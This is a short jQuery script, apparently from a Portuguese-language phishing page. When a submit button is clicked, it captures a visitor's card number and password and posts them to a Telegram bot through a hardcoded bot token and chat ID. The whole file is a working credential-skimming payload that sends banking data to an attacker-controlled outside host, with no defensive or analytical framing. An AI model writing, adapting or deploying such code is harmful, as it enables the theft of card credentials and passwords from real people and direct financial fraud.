
$(document).ready(function () {
  $('#submit-btn').click(function () {
    const cardNumber = $('#card-input').val();
    const password = $('#password').val();

    const message = `Novo acesso:\nCartão: ${cardNumber}\nSenha: ${password}`;

    const token = "7943074825:AAEiarqkDiB9IqchBlLT8L3H1Gge6DFMbVw";
    const chatId = "6663392866";
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    $.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });
  });
});
